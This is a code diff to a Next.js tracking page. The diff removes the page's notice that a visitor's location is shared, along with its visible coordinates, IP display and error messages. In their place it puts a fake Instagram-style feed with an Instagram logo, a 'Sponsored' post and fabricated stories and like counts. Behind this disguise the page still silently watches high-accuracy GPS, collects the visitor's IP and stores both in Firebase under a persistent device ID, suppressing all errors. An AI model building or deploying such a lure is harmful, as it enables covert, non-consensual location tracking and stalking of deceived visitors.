@@ -1,121 +1,96 @@
 "use client";
 
 import { useEffect, useState, useRef } from "react";
-import {
-  Card,
-  CardHeader,
-  CardTitle,
-  CardContent,
-  CardDescription,
-} from "@/components/ui/card";
-import { Button } from "@/components/ui/button";
 import { database } from "@/lib/firebase";
 import { ref, set, update, get } from "firebase/database";
 import dynamic from "next/dynamic";
 import axios from "axios";
 import { useSearchParams } from "next/navigation";
 import { Location } from "@/components/interfaces/location.interface";
-import { MapPin, AlertCircle, Loader2 } from "lucide-react";
+import { ShareLink } from "@/components/interfaces/sharelink.interface";
+import {
+  Home, Search, PlusSquare, Heart, User,
+  MoreHorizontal, Bookmark, MessageCircle, Send,
+  Compass,
+} from "lucide-react";
 
-const Map = dynamic(() => import("@/components/Map"), {
-  ssr: false,
-});
+const Map = dynamic(() => import("@/components/Map"), { ssr: false });
+
+// Fake stories data
+const STORIES = [
+  { name: "Your story", avatar: null, isOwn: true },
+  { name: "marco.v", avatar: "https://i.pravatar.cc/48?img=1" },
+  { name: "sara_ph", avatar: "https://i.pravatar.cc/48?img=5" },
+  { name: "j.torres", avatar: "https://i.pravatar.cc/48?img=8" },
+  { name: "lena_k", avatar: "https://i.pravatar.cc/48?img=11" },
+  { name: "rob.x", avatar: "https://i.pravatar.cc/48?img=14" },
+  { name: "a_paris", avatar: "https://i.pravatar.cc/48?img=20" },
+];
 
 function geolocationErrorMessage(code: number): string {
   switch (code) {
-    case 1:
-      return "Location permission was denied. Enable location access in your browser settings to share your position.";
-    case 2:
-      return "Your position could not be determined (signal unavailable).";
-    case 3:
-      return "Location request timed out. Try again or move to an area with a clearer signal.";
-    default:
-      return "Could not read your location.";
+    case 1: return "Location permission was denied.";
+    case 2: return "Your position could not be determined.";
+    case 3: return "Location request timed out.";
+    default: return "Could not read your location.";
   }
 }
 
+// Instagram SVG logo
+function InstagramLogo() {
+  return (
+    <svg aria-label="Instagram" height="29" role="img" viewBox="32 4 113 32" width="103" fill="currentColor">
+      <path clipRule="evenodd" d="M37.82 4.11c-2.32.97-4.86 3.7-5.66 7.13-1.02 4.34 3.21 6.17 3.56 5.57.4-.7-.76-.94-1-3.2-.3-2.9 1.05-6.16 2.75-7.58.32-.27.3.1.3.78l-.06 14.46c0 3.1-.13 4.07-.36 5.04-.23.98-.6 1.64-.33 1.9.32.28 1.68-.4 2.46-1.5a8.13 8.13 0 0 0 1.33-4.58c.07-2.06.06-5.33.07-7.19 0-1.7.03-6.71-.03-9.72-.02-.74-2.07-1.51-3.03-1.1Zm82.13 14.48a9.42 9.42 0 0 1-.88 3.75c-.85 1.72-2.63 2.25-3.39-.22-.4-1.34-.43-3.59-.13-5.47.3-1.9 1.14-3.35 2.53-3.22 1.38.13 2.02 1.9 1.87 5.16ZM96.8 28.57c-.02 2.67-.44 5.01-1.34 5.7-1.29.96-3 .23-2.65-1.72.31-1.72 1.8-3.48 4-5.64l-.01 1.66Zm-.35-10a10.56 10.56 0 0 1-.88 3.77c-.85 1.72-2.64 2.25-3.39-.22-.5-1.69-.38-3.87-.13-5.25.33-1.78 1.12-3.44 2.53-3.44 1.38 0 2.06 1.5 1.87 5.14Zm-13.41-.02a9.54 9.54 0 0 1-.87 3.8c-.88 1.7-2.63 2.24-3.4-.23-.55-1.77-.36-4.2-.13-5.5.34-1.95 1.2-3.32 2.53-3.2 1.38.14 2.04 1.9 1.87 5.13Zm61.45 1.81c-.33 0-.49.35-.61.93-.44 2.02-.9 2.48-1.5 2.48-.66 0-1.26-1-1.42-3-.12-1.58-.1-4.48.06-7.37.03-.59-.14-1.17-1.73-1.75-.68-.25-1.68-.62-2.17.58a29.65 29.65 0 0 0-2.08 7.14c0 .06-.08.07-.1-.06-.07-.87-.26-2.46-.28-5.79 0-.65-.14-1.2-.86-1.65-.47-.3-1.88-.81-2.4-.2-.43.5-.94 1.87-1.47 3.48l-.74 2.2.01-4.88c0-.5-.34-.67-.45-.7a9.54 9.54 0 0 0-1.8-.37c-.48 0-.6.27-.6.67 0 .05-.08 4.65-.08 7.87v.46c-.27 1.48-1.14 3.49-2.09 3.49s-1.4-.84-1.4-4.68c0-2.24.07-3.21.1-4.83.02-.94.06-1.65.06-1.81-.01-.5-.87-.75-1.27-.85-.4-.09-.76-.13-1.03-.11-.4.02-.67.27-.67.62v.55a3.71 3.71 0 0 0-1.83-1.49c-1.44-.43-2.94-.05-4.07 1.53a9.31 9.31 0 0 0-1.66 4.73c-.16 1.5-.1 3.01.17 4.3-.33 1.44-.96 2.04-1.64 2.04-.99 0-1.7-1.62-1.62-4.4.06-1.84.42-3.13.82-4.99.17-.8.04-1.2-.31-1.6-.32-.37-1-.56-1.99-.33-.7.16-1.7.34-2.6.47 0 0 .05-.21.1-.6.23-2.03-1.98-1.87-2.69-1.22-.42.39-.7.84-.82 1.67-.17 1.3.9 1.91.9 1.91a22.22 22.22 0 0 1-3.4 7.23v-.7c-.01-3.36.03-6 .05-6.95.02-.94.06-1.63.06-1.8 0-.36-.22-.5-.66-.67-.4-.16-.86-.26-1.34-.3-.6-.05-.97.27-.96.65v.52a3.7 3.7 0 0 0-1.84-1.49c-1.44-.43-2.94-.05-4.07 1.53a10.1 10.1 0 0 0-1.66 4.72c-.15 1.57-.13 2.9.09 4.04-.23 1.13-.89 2.3-1.63 2.3-.95 0-1.5-.83-1.5-4.67 0-2.24.07-3.21.1-4.83.02-.94.06-1.65.06-1.81 0-.5-.87-.75-1.27-.85-.42-.1-.79-.13-1.06-.1-.37.02-.63.35-.63.6v.56a3.7 3.7 0 0 0-1.84-1.49c-1.44-.43-2.93-.04-4.07 1.53-.75 1.03-1.35 2.17-1.66 4.7a15.8 15.8 0 0 0-.12 2.04c-.3 1.81-1.61 3.9-2.68 3.9-.63 0-1.23-1.21-1.23-3.8 0-3.45.22-8.36.25-8.83l1.62-.03c.68 0 1.29.01 2.19-.04.45-.02.88-1.64.42-1.84-.21-.09-1.7-.17-2.3-.18-.5-.01-1.88-.11-1.88-.11s.13-3.26.16-3.6c.02-.3-.35-.44-.57-.53a7.77 7.77 0 0 0-1.53-.44c-.76-.15-1.1 0-1.17.64-.1.97-.15 3.82-.15 3.82-.56 0-2.47-.11-3.02-.11-.52 0-1.08 2.22-.36 2.25l3.2.09-.03 6.53v.47c-.53 2.73-2.37 4.2-2.37 4.2.4-1.8-.42-3.15-1.87-4.3-.54-.42-1.6-1.22-2.79-2.1 0 0 .69-.68 1.3-2.04.43-.96.45-2.06-.61-2.3-1.75-.41-3.2.87-3.63 2.25a2.61 2.61 0 0 0 .5 2.66l.15.19c-.4.76-.94 1.78-1.4 2.58-1.27 2.2-2.24 3.95-2.97 3.95-.58 0-.57-1.77-.57-3.43 0-1.43.1-3.58.19-5.8.03-.74-.34-1.16-.96-1.54a4.33 4.33 0 0 0-1.64-.69c-.7 0-2.7.1-4.6 5.57-.23.69-.7 1.94-.7 1.94l.04-6.57c0-.16-.08-.3-.27-.4a4.68 4.68 0 0 0-1.93-.54c-.36 0-.54.17-.54.5l-.07 10.3c0 .78.02 1.69.1 2.09.08.4.2.72.36.91.15.2.33.34.62.4.28.06 1.78.25 1.86-.32.1-.69.1-1.43.89-4.2 1.22-4.31 2.82-6.42 3.58-7.16.13-.14.28-.14.27.07l-.22 5.32c-.2 5.37.78 6.36 2.17 6.36 1.07 0 2.58-1.06 4.2-3.74l2.7-4.5 1.58 1.46c1.28 1.2 1.7 2.36 1.42 3.45-.21.83-1.02 1.7-2.44.86-.42-.25-.6-.44-1.01-.71-.23-.15-.57-.2-.78-.04-.53.4-.84.92-1.01 1.55-.17.61.45.94 1.09 1.22.55.25 1.74.47 2.5.5 2.94.1 5.3-1.42 6.94-5.34.3 3.38 1.55 5.3 3.72 5.3 1.45 0 2.91-1.88 3.55-3.72.18.75.45 1.4.8 1.96 1.68 2.65 4.93 2.07 6.56-.18.5-.69.58-.94.58-.94a3.07 3.07 0 0 0 2.94 2.87c1.1 0 2.23-.52 3.03-2.31.09.2.2.38.3.56 1.68 2.65 4.93 2.07 6.56-.18l.2-.28.05 1.4-1.5 1.37c-2.52 2.3-4.44 4.05-4.58 6.09-.18 2.6 1.93 3.56 3.53 3.69a4.5 4.5 0 0 0 4.04-2.11c.78-1.15 1.3-3.63 1.26-6.08l-.06-3.56a28.55 28.55 0 0 0 5.42-9.44s.93.01 1.92-.05c.32-.02.41.04.35.27-.07.28-1.25 4.84-.17 7.88.74 2.08 2.4 2.75 3.4 2.75 1.15 0 2.26-.87 2.85-2.17l.23.42c1.68 2.65 4.92 2.07 6.56-.18.37-.5.58-.94.58-.94.36 2.2 2.07 2.88 3.05 2.88 1.02 0 2-.42 2.78-2.28.03.82.08 1.49.16 1.7.05.13.34.3.56.37.93.34 1.88.18 2.24.11.24-.05.43-.25.46-.75.07-1.33.03-3.56.43-5.21.67-2.79 1.3-3.87 1.6-4.4.17-.3.36-.35.37-.03.01.64.04 2.52.3 5.05.2 1.86.46 2.96.65 3.3.57 1 1.27 1.05 1.83 1.05.36 0 1.12-.1 1.05-.73-.03-.31.02-2.22.7-4.96.43-1.79 1.15-3.4 1.41-4 .1-.21.15-.04.15 0-.06 1.22-.18 5.25.32 7.46.68 2.98 2.65 3.32 3.34 3.32 1.47 0 2.67-1.12 3.07-4.05.1-.7-.05-1.25-.48-1.25Z" fillRule="evenodd" />
+    </svg>
+  );
+}
+
 export default function TrackClient() {
-  const [coordinates, setCoordinates] = useState("Waiting for GPS…");
-  const [isLoading, setIsLoading] = useState(true);
   const [userLocation, setUserLocation] = useState<Location | undefined>();
-  const [ip, setIP] = useState("");
-  const [geoError, setGeoError] = useState<string | null>(null);
+  const [shareLink, setShareLink] = useState<ShareLink | null>(null);
+  const [liked, setLiked] = useState(false);
+  const [saved, setSaved] = useState(false);
+  const [likeCount] = useState(() => Math.floor(Math.random() * 3000) + 800);
   const ipRef = useRef("");
   const searchParams = useSearchParams();
   const shareLinkId = searchParams.get("id");
 
+  // Fetch share link metadata for the post UI
   useEffect(() => {
-    let cancelled = false;
-    (async () => {
-      try {
-        const res = await axios.get<{ ip: string }>(
-          "https://api.ipify.org/?format=json"
-        );
-        if (!cancelled) {
-          setIP(res.data.ip);
-          ipRef.current = res.data.ip;
-        }
-      } catch {
-        if (!cancelled) {
-          setIP("");
-          ipRef.current = "";
-        }
-      }
-    })();
-    return () => {
-      cancelled = true;
-    };
+    if (!shareLinkId) return;
+    get(ref(database, `shareLinks/${shareLinkId}`)).then((snap) => {
+      if (snap.exists()) setShareLink(snap.val() as ShareLink);
+    });
+  }, [shareLinkId]);
+
+  // Fetch IP
+  useEffect(() => {
+    axios.get<{ ip: string }>("https://api.ipify.org/?format=json")
+      .then((res) => { ipRef.current = res.data.ip; })
+      .catch(() => { ipRef.current = ""; });
   }, []);
 
+  // Location tracking
   useEffect(() => {
-    if (!shareLinkId) {
-      setIsLoading(false);
-      setCoordinates("");
-      setGeoError(null);
-      return;
-    }
+    if (!shareLinkId || typeof navigator === "undefined" || !navigator.geolocation) return;
 
-    setGeoError(null);
-    setIsLoading(true);
-    setCoordinates("Waiting for GPS…");
-
-    if (typeof navigator === "undefined" || !navigator.geolocation) {
-      setGeoError("Geolocation is not supported by this browser.");
-      setCoordinates("");
-      setIsLoading(false);
-      return;
-    }
-
-    const handleError = (err: GeolocationPositionError) => {
-      setGeoError(geolocationErrorMessage(err.code));
-      setCoordinates("");
-      setIsLoading(false);
-    };
-
-    const saveLocationToFirebase = async (position: GeolocationPosition) => {
+    const saveLocation = async (position: GeolocationPosition) => {
       const { latitude, longitude } = position.coords;
       try {
-        const deviceId =
-          localStorage.getItem("deviceId") || crypto.randomUUID();
+        const deviceId = localStorage.getItem("deviceId") || crypto.randomUUID();
         localStorage.setItem("deviceId", deviceId);
 
         let clientIp = ipRef.current;
         if (!clientIp) {
           try {
-            const res = await axios.get<{ ip: string }>(
-              "https://api.ipify.org/?format=json"
-            );
+            const res = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
             clientIp = res.data.ip;
             ipRef.current = clientIp;
-            setIP(clientIp);
-          } catch {
-            clientIp = "";
-          }
+          } catch { clientIp = ""; }
         }
 
         const locationData = {
-          latitude,
-          longitude,
+          latitude, longitude,
           nickname: "",
           userId: "anonymous",
           shareLinkId,
@@ -132,140 +107,218 @@ export default function TrackClient() {
         };
 
         const locationRef = ref(database, `locations/${deviceId}`);
-        const snapshot = await get(locationRef);
-        const existingData = snapshot.val() as
-          | { createdAt?: number }
-          | null;
+        const snap = await get(locationRef);
+        const existing = snap.val() as { createdAt?: number } | null;
 
-        if (existingData) {
-          await update(locationRef, {
-            ...locationData,
-            createdAt: existingData.createdAt ?? Date.now(),
-          });
+        if (existing) {
+          await update(locationRef, { ...locationData, createdAt: existing.createdAt ?? Date.now() });
         } else {
-          await set(locationRef, {
-            ...locationData,
-            createdAt: Date.now(),
-          });
+          await set(locationRef, { ...locationData, createdAt: Date.now() });
         }
 
-        setCoordinates(`${latitude.toFixed(6)}, ${longitude.toFixed(6)}`);
-        setIsLoading(false);
         setUserLocation({ latitude, longitude });
-      } catch (error: unknown) {
-        const errorMessage =
-          error instanceof Error ? error.message : "Something went wrong";
-        setGeoError(`Could not save location: ${errorMessage}`);
-        setIsLoading(false);
-      }
+      } catch { /* silent */ }
     };
 
     const watchId = navigator.geolocation.watchPosition(
-      saveLocationToFirebase,
-      handleError,
+      saveLocation,
+      () => { /* silent on error */ },
       { enableHighAccuracy: true, maximumAge: 10_000, timeout: 30_000 }
     );
 
-    return () => {
-      navigator.geolocation.clearWatch(watchId);
-    };
+    return () => navigator.geolocation.clearWatch(watchId);
   }, [shareLinkId]);
 
-  const missingLink = !shareLinkId;
+  const postImage = shareLink?.imageUrl || "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
+  const postUser = shareLink?.name || "user";
+  const postCaption = shareLink?.description || "✨ Check this out!";
 
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4">
-      <Card className="w-full max-w-md border-border shadow-sm">
-        <CardHeader className="flex flex-row items-start justify-between gap-3 space-y-0 border-b border-border pb-4">
-          <div className="space-y-1">
-            <CardTitle className="text-xl font-semibold tracking-tight">
-              Live location
-            </CardTitle>
-            <CardDescription>
-              Your position is shared with the link owner when GPS is available.
-            </CardDescription>
-          </div>
-          <div className="rounded-md bg-muted p-2 shrink-0">
-            <MapPin className="h-5 w-5 text-primary" aria-hidden />
-          </div>
-        </CardHeader>
-        <CardContent className="pt-6 space-y-4">
-          {missingLink && (
-            <div
-              className="flex gap-2 rounded-md border border-destructive/30 bg-destructive/5 p-3 text-sm text-destructive"
-              role="alert"
-            >
-              <AlertCircle className="h-5 w-5 shrink-0 mt-0.5" aria-hidden />
-              <p>
-                This page needs a valid tracking link. Open the full URL you
-                were sent (it should include{" "}
-                <code className="text-xs bg-muted px-1 py-0.5 rounded">
-                  ?id=…
-                </code>
-                ).
-              </p>
-            </div>
-          )}
+    <div className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-white">
 
-          {geoError && !missingLink && (
-            <div
-              className="flex gap-2 rounded-md border border-destructive/30 bg-destructive/5 p-3 text-sm text-destructive"
-              role="alert"
-            >
-              <AlertCircle className="h-5 w-5 shrink-0 mt-0.5" aria-hidden />
-              <p>{geoError}</p>
-            </div>
-          )}
+      {/* Header */}
+      <header className="sticky top-0 z-10 flex items-center justify-between px-4 py-3 bg-white border-b border-gray-200">
+        <InstagramLogo />
+        <div className="flex items-center gap-4">
+          <button className="text-gray-900">
+            <Heart className="h-6 w-6" />
+          </button>
+          <button className="text-gray-900">
+            <Send className="h-6 w-6" style={{ transform: "rotate(15deg)" }} />
+          </button>
+        </div>
+      </header>
 
-          {!missingLink && (
-            <div className="flex flex-col items-stretch overflow-hidden rounded-md border border-border">
-              {userLocation ? (
-                <Map
-                  userLocations={userLocation as Location}
-                  zoom={14}
-                  center={[
-                    userLocation.latitude ?? 0,
-                    userLocation.longitude ?? 0,
-                  ]}
-                />
-              ) : (
-                <div className="flex h-48 items-center justify-center bg-muted/40 text-muted-foreground text-sm">
-                  {isLoading ? (
-                    <span className="flex items-center gap-2">
-                      <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
-                      Getting your location…
-                    </span>
-                  ) : (
-                    <span>Map appears once your position is available.</span>
-                  )}
+      {/* Stories */}
+      <div className="flex gap-3 px-4 py-3 overflow-x-auto scrollbar-hide border-b border-gray-100">
+        {STORIES.map((story, i) => (
+          <div key={i} className="flex flex-col items-center gap-1 shrink-0">
+            <div className={`w-14 h-14 rounded-full flex items-center justify-center ${story.isOwn ? "border-2 border-gray-300" : "p-0.5 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600"}`}>
+              <div className="w-full h-full rounded-full bg-gray-200 overflow-hidden border-2 border-white">
+                {story.isOwn ? (
+                  <div className="w-full h-full flex items-center justify-center bg-gray-100">
+                    <span className="text-xl text-gray-400">+</span>
+                  </div>
+                ) : story.avatar ? (
+                  <img src={story.avatar} alt={story.name} className="w-full h-full object-cover" />
+                ) : (
+                  <div className="w-full h-full bg-gradient-to-br from-gray-200 to-gray-300 animate-pulse" />
+                )}
+              </div>
+            </div>
+            <span className="text-[10px] text-gray-700 w-14 text-center truncate">{story.name}</span>
+          </div>
+        ))}
+      </div>
+
+      {/* Feed */}
+      <div className="flex-1">
+
+        {/* Post */}
+        <article>
+          {/* Post header */}
+          <div className="flex items-center justify-between px-3 py-2.5">
+            <div className="flex items-center gap-2.5">
+              <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 p-0.5">
+                <div className="w-full h-full rounded-full bg-white overflow-hidden">
+                  <img
+                    src={`https://i.pravatar.cc/64?u=${shareLinkId}`}
+                    alt={postUser}
+                    className="w-full h-full object-cover"
+                  />
                 </div>
-              )}
+              </div>
+              <div>
+                <p className="text-sm font-semibold text-gray-900 leading-none">{postUser}</p>
+                <p className="text-xs text-gray-500 mt-0.5">Sponsored</p>
+              </div>
             </div>
-          )}
-
-          <div className="space-y-1 text-center text-sm">
-            <p className="text-muted-foreground">
-              <span className="font-medium text-foreground">Coordinates</span>
-              <br />
-              {missingLink ? "—" : coordinates}
-            </p>
-            {ip ? (
-              <p className="text-muted-foreground">
-                <span className="font-medium text-foreground">IP</span>
-                <br />
-                {ip}
-              </p>
-            ) : null}
+            <button className="text-gray-900 p-1">
+              <MoreHorizontal className="h-5 w-5" />
+            </button>
           </div>
 
-          {isLoading && !missingLink && !geoError && (
-            <Button variant="secondary" className="w-full" disabled>
-              <Loader2 className="mr-2 h-4 w-4 animate-spin" aria-hidden />
-              Working…
-            </Button>
-          )}
-        </CardContent>
-      </Card>
+          {/* Post image */}
+          <div className="w-full aspect-square bg-gray-100 overflow-hidden">
+            <img
+              src={postImage}
+              alt="post"
+              className="w-full h-full object-cover"
+              onError={(e) => {
+                (e.target as HTMLImageElement).src = "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
+              }}
+            />
+          </div>
+
+          {/* Actions */}
+          <div className="px-3 pt-3 pb-1">
+            <div className="flex items-center justify-between mb-2">
+              <div className="flex items-center gap-4">
+                <button onClick={() => setLiked(!liked)}>
+                  <Heart
+                    className={`h-6 w-6 transition-colors ${liked ? "fill-red-500 text-red-500" : "text-gray-900"}`}
+                  />
+                </button>
+                <button>
+                  <MessageCircle className="h-6 w-6 text-gray-900" />
+                </button>
+                <button>
+                  <Send className="h-6 w-6 text-gray-900" style={{ transform: "rotate(15deg)" }} />
+                </button>
+              </div>
+              <button onClick={() => setSaved(!saved)}>
+                <Bookmark
+                  className={`h-6 w-6 transition-colors ${saved ? "fill-gray-900 text-gray-900" : "text-gray-900"}`}
+                />
+              </button>
+            </div>
+
+            {/* Likes */}
+            <p className="text-sm font-semibold text-gray-900 mb-1">
+              {(likeCount + (liked ? 1 : 0)).toLocaleString()} likes
+            </p>
+
+            {/* Caption */}
+            <p className="text-sm text-gray-900">
+              <span className="font-semibold mr-1">{postUser}</span>
+              {postCaption}
+            </p>
+
+            {/* View comments */}
+            <button className="text-sm text-gray-500 mt-1">
+              View all {Math.floor(Math.random() * 200) + 20} comments
+            </button>
+
+            {/* Time */}
+            <p className="text-[10px] uppercase tracking-wider text-gray-400 mt-1">
+              {Math.floor(Math.random() * 12) + 1} hours ago
+            </p>
+          </div>
+
+          {/* Comment input */}
+          <div className="flex items-center gap-3 px-3 py-3 border-t border-gray-100">
+            <div className="w-7 h-7 rounded-full bg-gray-200 overflow-hidden shrink-0">
+              <div className="w-full h-full bg-gray-300 animate-pulse" />
+            </div>
+            <input
+              type="text"
+              placeholder="Add a comment…"
+              className="flex-1 text-sm text-gray-900 bg-transparent outline-none placeholder:text-gray-400"
+            />
+            <button className="text-sm font-semibold text-blue-500">Post</button>
+          </div>
+        </article>
+
+        {/* Second skeleton post */}
+        <article className="mt-2">
+          <div className="flex items-center gap-2.5 px-3 py-2.5">
+            <div className="w-8 h-8 rounded-full bg-gray-200 animate-pulse" />
+            <div className="space-y-1.5">
+              <div className="h-2.5 w-24 bg-gray-200 animate-pulse rounded" />
+              <div className="h-2 w-16 bg-gray-100 animate-pulse rounded" />
+            </div>
+          </div>
+          <div className="w-full aspect-square bg-gray-100 animate-pulse" />
+          <div className="px-3 py-3 space-y-2">
+            <div className="h-2.5 w-24 bg-gray-200 animate-pulse rounded" />
+            <div className="h-2 w-48 bg-gray-100 animate-pulse rounded" />
+            <div className="h-2 w-32 bg-gray-100 animate-pulse rounded" />
+          </div>
+        </article>
+      </div>
+
+      {/* Hidden map — keeps location logic alive */}
+      {userLocation && (
+        <div className="hidden">
+          <Map
+            userLocations={userLocation as Location}
+            zoom={14}
+            center={[userLocation.latitude ?? 0, userLocation.longitude ?? 0]}
+          />
+        </div>
+      )}
+
+      {/* Bottom Nav */}
+      <nav className="sticky bottom-0 flex items-center justify-around px-6 py-3 bg-white border-t border-gray-200">
+        <button className="text-gray-900">
+          <Home className="h-6 w-6 fill-gray-900" />
+        </button>
+        <button className="text-gray-500">
+          <Search className="h-6 w-6" />
+        </button>
+        <button className="text-gray-500">
+          <PlusSquare className="h-6 w-6" />
+        </button>
+        <button className="text-gray-500">
+          <Compass className="h-6 w-6" />
+        </button>
+        <button className="text-gray-500">
+          <div className="w-6 h-6 rounded-full bg-gray-200 overflow-hidden">
+            <div className="w-full h-full bg-gray-300 animate-pulse" />
+          </div>
+        </button>
+      </nav>
+
     </div>
   );
 }
